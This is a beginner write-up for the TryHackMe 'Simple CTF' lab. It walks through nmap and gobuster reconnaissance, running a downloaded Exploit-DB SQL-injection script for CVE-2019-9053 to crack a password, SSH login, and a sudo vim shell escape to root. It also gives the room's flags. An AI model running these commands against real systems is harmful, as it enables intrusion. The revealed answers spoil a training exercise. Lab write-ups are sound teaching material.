# Simple CTF | TryHackMe Write-up

Hi everyone!

Today we’re going to solve the **[Simple CTF](https://tryhackme.com/room/easyctf)** challenge on TryHackMe. Let’s dive in.



## Question 1: How many services are running under port 1000?

For reconnaissance, we start with a full Nmap scan:

```bash
nmap -sS -sV -p- -A MACHINE_IP
```

After the scan completes, we get the following results:

```
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

Since we are asked how many services are running under port 1000, we look at ports below 1000:

* 21 (FTP)
* 80 (HTTP)

**Answer: 2**



## Question 2: What is running on the higher port?

From the scan results, port **2222** is running:

```
OpenSSH 7.2p2
```

**Answer: ssh**



## Question 3

Next, I performed directory enumeration using Gobuster. The scan returned:

```
/simple
```

This looked interesting. After visiting the page, we land on a **CMS Made Simple** website.

At the bottom of the page, we can see the version number:

```
CMS Made Simple version 2.2.8
```

The next logical step is to search for known vulnerabilities. A simple search like:

```
CVE CMS Made Simple 2.2.8
```

Leads to:

**Answer: CVE-2019-9053**



## Question 4: What kind of vulnerability is the application vulnerable to?

Reading the CVE description reveals that the vulnerability is a **time-based SQL Injection**.

Since the room expects a 4-letter answer:

**Answer: sqli**



## Question 5: What’s the password?

We download the exploit from Exploit-DB:

```bash
wget https://www.exploit-db.com/download/46635
```

After reviewing the script options, we execute it with a wordlist:

```bash
python 46635.py -w /usr/share/wordlists/rockyou.txt -u http://MACHINE_IP/simple
```

If you're using the AttackBox, you might encounter an error about a missing dependency:

```bash
pip install termcolor
```

If everything runs correctly, the script performs the SQL injection attack and retrieves credentials.

**Answer: secret**



## Question 6: Where can you login with the details obtained?

Using the credentials found, we can log in via SSH:

```bash
ssh mitch@MACHINE_IP -p 2222
```

**Answer: ssh**



## What’s the user flag?

Once logged in, simply read the user flag:

```bash
cat user.txt
```

**Answer: G00d j0b, keep up!**



## Question 7: Is there any other user in the home directory? What’s its name?

From Mitch’s home directory, move one level up:

```bash
cd .. && ls
```

You should see another user directory.

**Answer: sunbath**



## Question 8: What can you leverage to spawn a privileged shell?

To check sudo permissions:

```bash
sudo -l
```

The output shows:

```
User mitch may run the following commands:
(root) NOPASSWD: /usr/bin/vim
```

This means we can run **vim** as root without a password.

**Answer: vim**



## Question 9: What’s the root flag?

Since `vim` can be executed as root, we can use it to spawn a privileged shell.

One way to do this is:

```bash
sudo vim /etc/less
```

Once inside Vim, type:

```
:!/bin/sh
```

If successful, the `$` prompt should change to `#`, indicating root access.
To confirm:

```bash
whoami
```

Then retrieve the root flag:

```bash
cat /root/root.txt
```

**Answer: W3ll d0n3. You made it!**



## Conclusion

This room is a great beginner-friendly CTF that covers:

* Network reconnaissance with Nmap
* Web enumeration with Gobuster
* Identifying and exploiting known CVEs
* SQL Injection exploitation
* SSH access
* Basic privilege escalation using misconfigured sudo permissions

It’s a solid introduction to real-world penetration testing methodology:
Recon → Enumeration → Exploitation → Privilege Escalation.

If you’re starting out in cybersecurity or CTFs, this is definitely a good challenge to practice your fundamentals.

See you in the next write-up 🚀
